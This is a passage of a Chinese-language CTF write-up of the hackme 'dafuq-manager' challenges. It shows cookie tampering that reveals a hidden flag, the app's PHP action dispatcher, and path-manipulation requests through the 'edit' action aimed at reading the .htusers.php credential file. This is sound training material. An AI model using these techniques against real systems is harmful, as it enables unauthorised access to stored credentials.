/posts/ctf-hackme-web-write-up/31/1_hue67b14591c13ee9950fb00351709bd3b_18556_1320x0_resize_box_3.png 2x" src=/posts/ctf-hackme-web-write-up/31/1_hue67b14591c13ee9950fb00351709bd3b_18556_660x0_resize_box_3.png alt style=width:100%></figure></p><p>裡面是個管理檔案的界面：</p><p><figure><img class="my-0 rounded-md" loading=lazy srcset="/posts/ctf-hackme-web-write-up/31/2_hu9980b92a5e3ccf7d6b969db1bd0fa571_75231_330x0_resize_box_3.png 330w,
/posts/ctf-hackme-web-write-up/31/2_hu9980b92a5e3ccf7d6b969db1bd0fa571_75231_660x0_resize_box_3.png 660w,
/posts/ctf-hackme-web-write-up/31/2_hu9980b92a5e3ccf7d6b969db1bd0fa571_75231_1024x0_resize_box_3.png 1024w,
/posts/ctf-hackme-web-write-up/31/2_hu9980b92a5e3ccf7d6b969db1bd0fa571_75231_1320x0_resize_box_3.png 2x" src=/posts/ctf-hackme-web-write-up/31/2_hu9980b92a5e3ccf7d6b969db1bd0fa571_75231_660x0_resize_box_3.png alt style=width:100%></figure></p><p>在觀察過後可以發現，產生了一個 cookie 叫做「<code>show_hidden</code>」其值為<code>no</code>。</p><p><figure><img class="my-0 rounded-md" loading=lazy srcset="/posts/ctf-hackme-web-write-up/31/3_hua6d3d50179d1ccef2d6168dbd79a3a08_21364_330x0_resize_box_3.png 330w,
/posts/ctf-hackme-web-write-up/31/3_hua6d3d50179d1ccef2d6168dbd79a3a08_21364_660x0_resize_box_3.png 660w,
/posts/ctf-hackme-web-write-up/31/3_hua6d3d50179d1ccef2d6168dbd79a3a08_21364_1024x0_resize_box_3.png 1024w,
/posts/ctf-hackme-web-write-up/31/3_hua6d3d50179d1ccef2d6168dbd79a3a08_21364_1320x0_resize_box_3.png 2x" src=/posts/ctf-hackme-web-write-up/31/3_hua6d3d50179d1ccef2d6168dbd79a3a08_21364_660x0_resize_box_3.png alt style=width:100%></figure></p><p>追隨本性，改成<code>yes</code>，就可以看到頁面上的隱藏檔案「<code>.good.job.here.is.your.hidden.flag-1.txt</code>」：</p><p><figure><img class="my-0 rounded-md" loading=lazy srcset="/posts/ctf-hackme-web-write-up/31/4_hue5e2b14d73737c8e7b066ba64b5863c9_84034_330x0_resize_box_3.png 330w,
/posts/ctf-hackme-web-write-up/31/4_hue5e2b14d73737c8e7b066ba64b5863c9_84034_660x0_resize_box_3.png 660w,
/posts/ctf-hackme-web-write-up/31/4_hue5e2b14d73737c8e7b066ba64b5863c9_84034_1024x0_resize_box_3.png 1024w,
/posts/ctf-hackme-web-write-up/31/4_hue5e2b14d73737c8e7b066ba64b5863c9_84034_1320x0_resize_box_3.png 2x" src=/posts/ctf-hackme-web-write-up/31/4_hue5e2b14d73737c8e7b066ba64b5863c9_84034_660x0_resize_box_3.png alt style=width:100%></figure></p><p>打開就可以看到 flag <code>FLAG{Wow, how did you found me? I was hidden!}</code>。</p><hr><h2 class="relative group">32. <a href=https://dafuq-manager.hackme.quest/ target=_blank>dafuq-manager 2</a><div id=32-dafuq-manager-2httpsdafuq-managerhackmequest class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#32-dafuq-manager-2httpsdafuq-managerhackmequest aria-label=定位點>#</a></span></h2><blockquote><p>Login as admin, code review and get flag 2</p></blockquote><p>上一題可以看到還有一個隱藏檔案「<code>.where-is-flag-2-please-tell-me.txt</code>」，這是這題的提示：<br>裡面寫著：「<code>Try to login as admin! and you will get flag2</code>」</p><p>開始嘗試撈管理員的帳號密碼。</p><hr><p>我們可以下載目錄下的<code>dafuqManager.7z</code>來了解整個系統的架構。</p><p><figure><img class="my-0 rounded-md" loading=lazy srcset="/posts/ctf-hackme-web-write-up/32/1_hue8d617258b04b964cd8575ae6a1844eb_13135_330x0_resize_box_3.png 330w,
/posts/ctf-hackme-web-write-up/32/1_hue8d617258b04b964cd8575ae6a1844eb_13135_660x0_resize_box_3.png 660w,
/posts/ctf-hackme-web-write-up/32/1_hue8d617258b04b964cd8575ae6a1844eb_13135_1024x0_resize_box_3.png 1024w,
/posts/ctf-hackme-web-write-up/32/1_hue8d617258b04b964cd8575ae6a1844eb_13135_1320x0_resize_box_3.png 2x" src=/posts/ctf-hackme-web-write-up/32/1_hue8d617258b04b964cd8575ae6a1844eb_13135_660x0_resize_box_3.png alt style=width:100%></figure></p><p>Source code of <code>index.php</code>:</p><div class=highlight><pre tabindex=0 style=color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-phtml data-lang=phtml><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#78787e>&lt;?php</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span>ini_set(<span style=color:#5af78e>&#39;memory_limit&#39;</span>, <span style=color:#5af78e>&#39;16M&#39;</span>);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span>ini_set(<span style=color:#5af78e>&#39;upload_max_filesize&#39;</span>, <span style=color:#5af78e>&#39;1k&#39;</span>);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span>error_reporting(<span style=color:#ff6ac1>E_ALL</span> <span style=color:#ff6ac1>^</span> E_NOTICE <span style=color:#ff6ac1>^</span> <span style=color:#ff6ac1>E_WARNING</span>);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span>define(<span style=color:#5af78e>&#39;ROOT&#39;</span>, dirname(realpath(<span style=color:#ff9f43>__FILE__</span>)));
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>umask(<span style=color:#ff9f43>002</span>);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span><span style=color:#ff6ac1>require</span> <span style=color:#5af78e>&#34;./core/init.php&#34;</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span><span style=color:#ff6ac1>switch</span> (<span style=color:#ff5c57>$GLOBALS</span>[<span style=color:#5af78e>&#34;action&#34;</span>]) {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span>        <span style=color:#78787e>// EDIT FILE
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span><span style=color:#78787e></span>        
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span>    <span style=color:#ff6ac1>case</span> <span style=color:#5af78e>&#34;edit&#34;</span><span style=color:#ff6ac1>:</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span>        <span style=color:#ff6ac1>require</span> <span style=color:#5af78e>&#34;./core/fun_edit.php&#34;</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span>        edit_file(<span style=color:#ff5c57>$GLOBALS</span>[<span style=color:#5af78e>&#34;dir&#34;</span>], <span style=color:#ff5c57>$GLOBALS</span>[<span style=color:#5af78e>&#34;item&#34;</span>]);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span>    <span style=color:#ff6ac1>break</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span>        <span style=color:#78787e>// DELETE FILE(S)/DIR(S)
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span><span style=color:#78787e></span>        
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span>    <span style=color:#ff6ac1>case</span> <span style=color:#5af78e>&#34;delete&#34;</span><span style=color:#ff6ac1>:</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span>        <span style=color:#ff6ac1>require</span> <span style=color:#5af78e>&#34;./core/fun_del.php&#34;</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span>        del_items(<span style=color:#ff5c57>$GLOBALS</span>[<span style=color:#5af78e>&#34;dir&#34;</span>]);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span>    <span style=color:#ff6ac1>break</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span>        <span style=color:#78787e>// COPY/MOVE FILE(S)/DIR(S)
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span><span style=color:#78787e></span>        
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23</span><span>    <span style=color:#ff6ac1>case</span> <span style=color:#5af78e>&#34;copy&#34;</span><span style=color:#ff6ac1>:</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24</span><span>    <span style=color:#ff6ac1>case</span> <span style=color:#5af78e>&#34;move&#34;</span><span style=color:#ff6ac1>:</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25</span><span>        <span style=color:#ff6ac1>require</span> <span style=color:#5af78e>&#34;./core/fun_copy_move.php&#34;</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26</span><span>        copy_move_items(<span style=color:#ff5c57>$GLOBALS</span>[<span style=color:#5af78e>&#34;dir&#34;</span>]);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27</span><span>    <span style=color:#ff6ac1>break</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28</span><span>        <span style=color:#78787e>// DOWNLOAD FILE
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29</span><span><span style=color:#78787e></span>        
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30</span><span>    <span style=color:#ff6ac1>case</span> <span style=color:#5af78e>&#34;download&#34;</span><span style=color:#ff6ac1>:</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31</span><span>        ob_start(); <span style=color:#78787e>// prevent unwanted output
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32</span><span><span style=color:#78787e></span>        <span style=color:#ff6ac1>require</span> <span style=color:#5af78e>&#34;./core/fun_down.php&#34;</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">33</span><span>        ob_end_clean(); <span style=color:#78787e>// get rid of cached unwanted output
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">34</span><span><span style=color:#78787e></span>        download_item(<span style=color:#ff5c57>$GLOBALS</span>[<span style=color:#5af78e>&#34;dir&#34;</span>], <span style=color:#ff5c57>$GLOBALS</span>[<span style=color:#5af78e>&#34;item&#34;</span>]);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">35</span><span>        ob_start(<span style=color:#ff6ac1>false</span>); <span style=color:#78787e>// prevent unwanted output
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">36</span><span><span style=color:#78787e></span>        <span style=color:#ff6ac1>exit</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">37</span><span>    <span style=color:#ff6ac1>break</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">38</span><span>        <span style=color:#78787e>// UPLOAD FILE(S)
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">39</span><span><span style=color:#78787e></span>        
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">40</span><span>    <span style=color:#ff6ac1>case</span> <span style=color:#5af78e>&#34;upload&#34;</span><span style=color:#ff6ac1>:</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">41</span><span>        <span style=color:#ff6ac1>require</span> <span style=color:#5af78e>&#34;./core/fun_up.php&#34;</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">42</span><span>        upload_items(<span style=color:#ff5c57>$GLOBALS</span>[<span style=color:#5af78e>&#34;dir&#34;</span>]);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">43</span><span>    <span style=color:#ff6ac1>break</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">44</span><span>        <span style=color:#78787e>// CREATE DIR/FILE
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">45</span><span><span style=color:#78787e></span>        
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">46</span><span>    <span style=color:#ff6ac1>case</span> <span style=color:#5af78e>&#34;mkitem&#34;</span><span style=color:#ff6ac1>:</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">47</span><span>        <span style=color:#ff6ac1>require</span> <span style=color:#5af78e>&#34;./core/fun_mkitem.php&#34;</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">48</span><span>        make_item(<span style=color:#ff5c57>$GLOBALS</span>[<span style=color:#5af78e>&#34;dir&#34;</span>]);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">49</span><span>    <span style=color:#ff6ac1>break</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">50</span><span>        <span style=color:#78787e>// CHMOD FILE/DIR
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">51</span><span><span style=color:#78787e></span>        
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">52</span><span>    <span style=color:#ff6ac1>case</span> <span style=color:#5af78e>&#34;chmod&#34;</span><span style=color:#ff6ac1>:</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">53</span><span>        <span style=color:#ff6ac1>require</span> <span style=color:#5af78e>&#34;./core/fun_chmod.php&#34;</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">54</span><span>        chmod_item(<span style=color:#ff5c57>$GLOBALS</span>[<span style=color:#5af78e>&#34;dir&#34;</span>], <span style=color:#ff5c57>$GLOBALS</span>[<span style=color:#5af78e>&#34;item&#34;</span>]);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">55</span><span>    <span style=color:#ff6ac1>break</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">56</span><span>        <span style=color:#78787e>// SEARCH FOR FILE(S)/DIR(S)
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">57</span><span><span style=color:#78787e></span>        
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">58</span><span>    <span style=color:#ff6ac1>case</span> <span style=color:#5af78e>&#34;search&#34;</span><span style=color:#ff6ac1>:</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">59</span><span>        <span style=color:#ff6ac1>require</span> <span style=color:#5af78e>&#34;./core/fun_search.php&#34;</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">60</span><span>        search_items(<span style=color:#ff5c57>$GLOBALS</span>[<span style=color:#5af78e>&#34;dir&#34;</span>]);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">61</span><span>    <span style=color:#ff6ac1>break</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">62</span><span>        <span style=color:#78787e>// CREATE ARCHIVE
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">63</span><span><span style=color:#78787e></span>        
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">64</span><span>    <span style=color:#ff6ac1>case</span> <span style=color:#5af78e>&#34;arch&#34;</span><span style=color:#ff6ac1>:</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">65</span><span>        <span style=color:#ff6ac1>require</span> <span style=color:#5af78e>&#34;./core/fun_archive.php&#34;</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">66</span><span>        archive_items(<span style=color:#ff5c57>$GLOBALS</span>[<span style=color:#5af78e>&#34;dir&#34;</span>]);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">67</span><span>    <span style=color:#ff6ac1>break</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">68</span><span>        <span style=color:#78787e>// USER-ADMINISTRATION
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">69</span><span><span style=color:#78787e></span>        
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">70</span><span>    <span style=color:#ff6ac1>case</span> <span style=color:#5af78e>&#34;admin&#34;</span><span style=color:#ff6ac1>:</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">71</span><span>        <span style=color:#ff6ac1>require</span> <span style=color:#5af78e>&#34;./core/fun_admin.php&#34;</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">72</span><span>        show_admin(<span style=color:#ff5c57>$GLOBALS</span>[<span style=color:#5af78e>&#34;dir&#34;</span>]);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">73</span><span>    <span style=color:#ff6ac1>break</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">74</span><span>    <span style=color:#ff6ac1>case</span> <span style=color:#5af78e>&#34;debug&#34;</span><span style=color:#ff6ac1>:</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">75</span><span>        <span style=color:#ff6ac1>require</span> <span style=color:#5af78e>&#34;./core/fun_debug.php&#34;</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">76</span><span>        do_debug(<span style=color:#ff5c57>$GLOBALS</span>[<span style=color:#5af78e>&#34;dir&#34;</span>]);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">77</span><span>    <span style=color:#ff6ac1>break</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">78</span><span>        <span style=color:#78787e>// DEFAULT: LIST FILES &amp; DIRS
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">79</span><span><span style=color:#78787e></span>        
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">80</span><span>    <span style=color:#ff6ac1>case</span> <span style=color:#5af78e>&#34;list&#34;</span><span style=color:#ff6ac1>:</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">81</span><span>    <span style=color:#ff6ac1>default</span><span style=color:#ff6ac1>:</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">82</span><span>        <span style=color:#ff6ac1>require</span> <span style=color:#5af78e>&#34;./core/fun_list.php&#34;</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">83</span><span>        list_dir(<span style=color:#ff5c57>$GLOBALS</span>[<span style=color:#5af78e>&#34;dir&#34;</span>]);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">84</span><span>} <span style=color:#78787e>// end switch-statement
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">85</span><span><span style=color:#78787e></span>show_footer();
</span></span></code></pre></div><p>可以看到有許多<code>action</code>可以做。<br>其中有些功能就放在界面上方：</p><p><figure><img class="my-0 rounded-md" loading=lazy srcset="/posts/ctf-hackme-web-write-up/32/2_hud398818b09946658e81f24365bba1de3_17814_330x0_resize_box_3.png 330w,
/posts/ctf-hackme-web-write-up/32/2_hud398818b09946658e81f24365bba1de3_17814_660x0_resize_box_3.png 660w,
/posts/ctf-hackme-web-write-up/32/2_hud398818b09946658e81f24365bba1de3_17814_1024x0_resize_box_3.png 1024w,
/posts/ctf-hackme-web-write-up/32/2_hud398818b09946658e81f24365bba1de3_17814_1320x0_resize_box_3.png 2x" src=/posts/ctf-hackme-web-write-up/32/2_hud398818b09946658e81f24365bba1de3_17814_660x0_resize_box_3.png alt style=width:100%></figure></p><p>例如「<code>搜尋</code>」功能，點擊後可以看到網址顯示「<code>https://dafuq-manager.hackme.quest/index.php?action=search&amp;order=name&amp;srt=yes&amp;lang=cht</code>」，<code>action</code>就直接使用<code>GET</code>傳遞即可，其他參數也是。</p><p>我們的目標是管理員的帳號密碼，我們可以從下載下來的檔案中發現，<code>guest</code>的密碼被存放在<code>.config/.htusers.php</code>中：</p><p><figure><img class="my-0 rounded-md" loading=lazy srcset="/posts/ctf-hackme-web-write-up/32/3_hub448a7f2b175839b1fe4e46d08e7d3ff_15558_330x0_resize_box_3.png 330w,
/posts/ctf-hackme-web-write-up/32/3_hub448a7f2b175839b1fe4e46d08e7d3ff_15558_660x0_resize_box_3.png 660w,
/posts/ctf-hackme-web-write-up/32/3_hub448a7f2b175839b1fe4e46d08e7d3ff_15558_1024x0_resize_box_3.png 1024w,
/posts/ctf-hackme-web-write-up/32/3_hub448a7f2b175839b1fe4e46d08e7d3ff_15558_1320x0_resize_box_3.png 2x" src=/posts/ctf-hackme-web-write-up/32/3_hub448a7f2b175839b1fe4e46d08e7d3ff_15558_660x0_resize_box_3.png alt style=width:100%></figure></p><p>只要有辦法讀取該檔案，應該就可以看到管理員的密碼。<br>上面的<code>action</code>中有一個<code>edit</code>功能可以編輯檔案，而該功能要輸入兩個參數，分別是欲編輯檔案的路徑<code>dir</code>以及檔名<code>item</code>。</p><hr><p>直接嘗試：<code>action=edit&amp;dir=.config/&amp;item=.htusers.php</code>，顯示錯誤：</p><p><figure><img class="my-0 rounded-md" loading=lazy srcset="/posts/ctf-hackme-web-write-up/32/4_hub9d6385682511e50c7300a1b87c46727_17125_330x0_resize_box_3.png 330w,
/posts/ctf-hackme-web-write-up/32/4_hub9d6385682511e50c7300a1b87c46727_17125_660x0_resize_box_3.png 660w,
/posts/ctf-hackme-web-write-up/32/4_hub9d6385682511e50c7300a1b87c46727_17125_1024x0_resize_box_3.png 1024w,
/posts/ctf-hackme-web-write-up/32/4_hub9d6385682511e50c7300a1b87c46727_17125_1320x0_resize_box_3.png 2x" src=/posts/ctf-hackme-web-write-up/32/4_hub9d6385682511e50c7300a1b87c46727_17125_660x0_resize_box_3.png alt style=width:100%></figure></p><p>根目錄似乎在是在<code>/var/www/webhdisk/</code>。<br>輸入絕對路徑試試：<code>action=edit&amp;dir=/var/www/webhdisk/.config/&amp;item=.htusers.php</code>：</p><p><figure><img class="my-0 rounded-md" loading=lazy srcset="/posts/ctf-hackme-web-write-up/32/5_hubb4fc1f17ae5469ccce5f651006b903f_18301_330x0_resize_box_3.png 330w,
/posts/ctf-hackme-web-write-up/32/5_hubb4fc1f17ae5469ccce5f651006b903f_18301_660x0_resize_box_3.png 660w,
/posts/ctf-hackme-web-write-up/32/5_hubb4fc1f17ae5469ccce5f651006b903f_18301_1024x0_resize_box_3.png 1024w,
/posts/ctf-hackme-web-write-up/32/5_hubb4fc1f17ae5469ccce5f651006b903f_18301_1320x0_resize_box_3.png 2x" src=/posts/ctf-hackme-web-write-up/32/5_hubb4fc1f17ae5469ccce5f651006b903f_18301_660x0_resize_box_3.png alt style=width:100%></figure></p><p>好吧看來根目錄不是這樣，嘗試使用相對路徑。<br>嘗試許多次，還是顯示檔案不存在：</p><p><figure><img class="my-0 rounded-md" loading=lazy srcset="/posts/ctf-hackme-web-write-up/32/6_hu3f98e7fefa237b8da29c793843434845_20228_330x0_resize_box_3.png 330w,
/posts/ctf-hackme-web-write-up/32/6_hu3f98e7fefa237b8da29c793843434845_20228_660x0_resize_box_3.png 660w,
/posts/ctf-hackme-web-write-up/32/6_hu3f98e7fefa237b8da29c793843434845_20228_1024x0_resize_box_3.png 1024w,
